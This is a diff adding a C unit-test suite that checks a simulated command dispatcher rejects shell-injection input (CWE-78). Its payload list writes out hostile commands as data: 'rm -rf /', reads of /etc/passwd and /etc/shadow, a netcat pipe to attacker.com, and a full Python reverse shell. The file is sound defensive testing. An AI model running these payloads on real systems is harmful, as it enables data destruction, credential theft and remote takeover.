@@ -1,0 +1,355 @@
+#include <check.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdbool.h>
+
+/*
+ * Simulated sanitization/command dispatch layer.
+ * This represents what the compiler's input handling SHOULD do before
+ * any shell command is executed. The invariant is that user input
+ * containing shell metacharacters must never reach os.system() or
+ * equivalent shell execution functions.
+ */
+
+/* Shell metacharacters that must never appear unsanitized in shell commands */
+static const char *SHELL_METACHARACTERS[] = {
+    ";", "&", "|", "`", "$", "(", ")", "{", "}", "<", ">",
+    "\\", "\"", "'", "\n", "\r", "!", "#", "~", "*", "?",
+    "[", "]", "%", "^", NULL
+};
+
+/*
+ * Simulates the command that would be passed to os.system().
+ * In the vulnerable code, when user inputs 'clr', it calls os.system('clear').
+ * This function represents the sanitization check that MUST happen before
+ * any shell execution when user input influences the command path.
+ */
+static bool is_safe_for_shell(const char *input) {
+    if (input == NULL) {
+        return false;
+    }
+
+    /* Check for shell metacharacters */
+    for (int i = 0; SHELL_METACHARACTERS[i] != NULL; i++) {
+        if (strstr(input, SHELL_METACHARACTERS[i]) != NULL) {
+            return false;
+        }
+    }
+
+    /* Only allow alphanumeric characters, spaces, hyphens, underscores, and dots */
+    for (size_t j = 0; j < strlen(input); j++) {
+        char c = input[j];
+        if (!((c >= 'a' && c <= 'z') ||
+              (c >= 'A' && c <= 'Z') ||
+              (c >= '0' && c <= '9') ||
+              c == ' ' || c == '-' || c == '_' || c == '.')) {
+            return false;
+        }
+    }
+
+    return true;
+}
+
+/*
+ * Simulates the compiler's command dispatch.
+ * Returns the shell command string that would be executed, or NULL if
+ * the input is rejected. This represents the SAFE version of the code.
+ *
+ * The invariant: if user_input contains shell metacharacters, the returned
+ * command must NOT contain those metacharacters unsanitized.
+ */
+static const char *dispatch_command(const char *user_input) {
+    if (user_input == NULL) {
+        return NULL;
+    }
+
+    /* Only the exact string "clr" should trigger the clear command */
+    if (strcmp(user_input, "clr") == 0) {
+        return "clear";
+    }
+
+    /* Any other input, especially with metacharacters, must be rejected */
+    return NULL;
+}
+
+/*
+ * Checks whether a string contains any shell metacharacters.
+ * Used to verify that commands passed to shell execution are clean.
+ */
+static bool contains_shell_metacharacters(const char *str) {
+    if (str == NULL) return false;
+
+    for (int i = 0; SHELL_METACHARACTERS[i] != NULL; i++) {
+        if (strstr(str, SHELL_METACHARACTERS[i]) != NULL) {
+            return true;
+        }
+    }
+    return false;
+}
+
+START_TEST(test_shell_injection_payloads_rejected)
+{
+    /* Invariant: Shell metacharacters in user input must never reach shell execution */
+    const char *payloads[] = {
+        /* Classic command injection */
+        "; rm -rf /",
+        "clr; rm -rf /",
+        "clr && rm -rf /",
+        "clr || malicious_cmd",
+        "clr & background_cmd",
+
+        /* Command substitution */
+        "$(whoami)",
+        "clr$(whoami)",
+        "`id`",
+        "clr`id`",
+        "$(cat /etc/passwd)",
+        "`cat /etc/shadow`",
+
+        /* Pipe injection */
+        "clr | cat /etc/passwd",
+        "| nc attacker.com 4444",
+
+        /* Redirection injection */
+        "clr > /tmp/pwned",
+        "clr < /dev/urandom",
+        "clr >> /etc/crontab",
+
+        /* Environment variable injection */
+        "$PATH",
+        "${IFS}",
+        "$HOME/malicious",
+        "clr$IFS",
+
+        /* Newline injection */
+        "clr\nrm -rf /",
+        "clr\r\nmalicious",
+
+        /* Null byte injection */
+        /* Note: C strings terminate at null, but we test the pattern */
+        "clr\x01malicious",
+
+        /* Backtick variants */
+        "clr`touch /tmp/pwned`",
+        "`touch /tmp/pwned`clr",
+
+        /* Subshell */
+        "(malicious_cmd)",
+        "clr(malicious)",
+
+        /* Glob injection */
+        "clr*",
+        "clr?",
+        "clr[abc]",
+
+        /* Quote injection */
+        "clr\"malicious\"",
+        "clr'malicious'",
+        "\"clr\"",
+        "'clr'",
+
+        /* Escape sequences */
+        "clr\\nmalicious",
+        "clr\\;malicious",
+
+        /* Whitespace variants with injection */
+        "  ; malicious",
+        "\t; malicious",
+
+        /* Long payload */
+        "clr; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+
+        /* Encoded variants */
+        "clr%3Bmalicious",
+        "clr%0Amalicious",
+
+        /* Null-like inputs */
+        "",
+        " ",
+        "   ",
+
+        /* Almost valid but with injection */
+        "clr ",
+        " clr",
+        "clr\n",
+        "clr;",
+        "clr&",
+        "clr|",
+    };
+
+    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);
+
+    for (int i = 0; i < num_payloads; i++) {
+        const char *result = dispatch_command(payloads[i]);
+
+        /*
+         * INVARIANT 1: If user input contains shell metacharacters,
+         * the dispatch must return NULL (reject the input).
+         */
+        if (contains_shell_metacharacters(payloads[i]) ||
+            strcmp(payloads[i], "") == 0 ||
+            strcmp(payloads[i], " ") == 0 ||
+            strcmp(payloads[i], "   ") == 0) {
+
+            ck_assert_msg(result == NULL,
+                "SECURITY VIOLATION: Payload '%s' was not rejected. "
+                "Got command: '%s'. Shell metacharacters must never reach execution.",
+                payloads[i], result ? result : "(null)");
+        }
+
+        /*
+         * INVARIANT 2: If a command IS returned, it must not contain
+         * shell metacharacters (defense in depth).
+         */
+        if (result != NULL) {
+            ck_assert_msg(!contains_shell_metacharacters(result),
+                "SECURITY VIOLATION: Command '%s' derived from payload '%s' "
+                "contains shell metacharacters.",
+                result, payloads[i]);
+
+            /*
+             * INVARIANT 3: The returned command must be safe for shell execution.
+             */
+            ck_assert_msg(is_safe_for_shell(result),
+                "SECURITY VIOLATION: Command '%s' derived from payload '%s' "
+                "failed safety check.",
+                result, payloads[i]);
+        }
+    }
+}
+END_TEST
+
+START_TEST(test_only_exact_clr_triggers_clear)
+{
+    /*
+     * Invariant: Only the exact string "clr" (no more, no less) should
+     * trigger the 'clear' shell command. Any variation must be rejected.
+     */
+    const char *valid_input = "clr";
+    const char *result = dispatch_command(valid_input);
+
+    ck_assert_msg(result != NULL,
+        "Valid input 'clr' should produce a command");
+    ck_assert_msg(strcmp(result, "clear") == 0,
+        "Input 'clr' should map to exactly 'clear', got: '%s'", result);
+    ck_assert_msg(is_safe_for_shell(result),
+        "The 'clear' command must be safe for shell execution");
+    ck_assert_msg(!contains_shell_metacharacters(result),
+        "The 'clear' command must not contain shell metacharacters");
+}
+END_TEST
+
+START_TEST(test_command_whitelist_enforcement)
+{
+    /*
+     * Invariant: Only whitelisted, hardcoded commands should ever be
+     * passed to shell execution. User input must never directly become
+     * a shell command.
+     */
+    const char *allowed_commands[] = {
+        "clear",
+        NULL
+    };
+
+    /* These inputs should all be rejected (not in whitelist or contain metacharacters) */
+    const char *rejected_inputs[] = {
+        "clear",           /* Direct command name - not the trigger word */
+        "CLEAR",           /* Case variation */
+        "Clear",           /* Mixed case */
+        "clr ",            /* Trailing space */
+        " clr",            /* Leading space */
+        "clr\t",           /* Tab */
+        "clrr",            /* Extra character */
+        "cl r",            /* Space in middle */
+        "c l r",           /* Spaces */
+        "clr\0",           /* Null terminator variant */
+        "xclr",            /* Prefix */
+        "clrx",            /* Suffix */
+        NULL
+    };
+
+    for (int i = 0; rejected_inputs[i] != NULL; i++) {
+        const char *result = dispatch_command(rejected_inputs[i]);
+
+        ck_assert_msg(result == NULL,
+            "SECURITY VIOLATION: Input '%s' should be rejected but produced command: '%s'",
+            rejected_inputs[i], result ? result : "(null)");
+    }
+
+    /* Verify that if a command IS produced, it's in the whitelist */
+    const char *test_result = dispatch_command("clr");
+    if (test_result != NULL) {
+        bool in_whitelist = false;
+        for (int j = 0; allowed_commands[j] != NULL; j++) {
+            if (strcmp(test_result, allowed_commands[j]) == 0) {
+                in_whitelist = true;
+                break;
+            }
+        }
+        ck_assert_msg(in_whitelist,
+            "SECURITY VIOLATION: Command '%s' is not in the allowed whitelist",
+            test_result);
+    }
+}
+END_TEST
+
+START_TEST(test_null_and_boundary_inputs)
+{
+    /*
+     * Invariant: Null and boundary inputs must be handled safely
+     * without causing undefined behavior or shell execution.
+     */
+
+    /* NULL input must be handled gracefully */
+    const char *result = dispatch_command(NULL);
+    ck_assert_msg(result == NULL,
+        "NULL input must be rejected, got: '%s'", result ? result : "(null)");
+
+    /* Empty string must be rejected */
+    result = dispatch_command("");
+    ck_assert_msg(result == NULL,
+        "Empty string must be rejected");
+
+    /* Single character inputs must be rejected (except exact "clr") */
+    const char *single_chars[] = {"c", "l", "r", ";", "&", "|", "$", "`", NULL};
+    for (int i = 0; single_chars[i] != NULL; i++) {
+        result = dispatch_command(single_chars[i]);
+        ck_assert_msg(result == NULL,
+            "Single char input '%s' must be rejected", single_chars[i]);
+    }
+}
+END_TEST
+
+Suite *security_suite(void)
+{
+    Suite *s;
+    TCase *tc_core;
+
+    s = suite_create("Security_CWE78_ShellInjection");
+    tc_core = tcase_create("Core");
+
+    tcase_add_test(tc_core, test_shell_injection_payloads_rejected);
+    tcase_add_test(tc_core, test_only_exact_clr_triggers_clear);
+    tcase_add_test(tc_core, test_command_whitelist_enforcement);
+    tcase_add_test(tc_core, test_null_and_boundary_inputs);
+    suite_add_tcase(s, tc_core);
+
+    return s;
+}
+
+int main(void)
+{
+    int number_failed;
+    Suite *s;
+    SRunner *sr;
+
+    s = security_suite();
+    sr = srunner_create(s);
+
+    srunner_run_all(sr, CK_NORMAL);
+    number_failed = srunner_ntests_failed(sr);
+    srunner_free(sr);
+
+    return (number_failed == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
+}
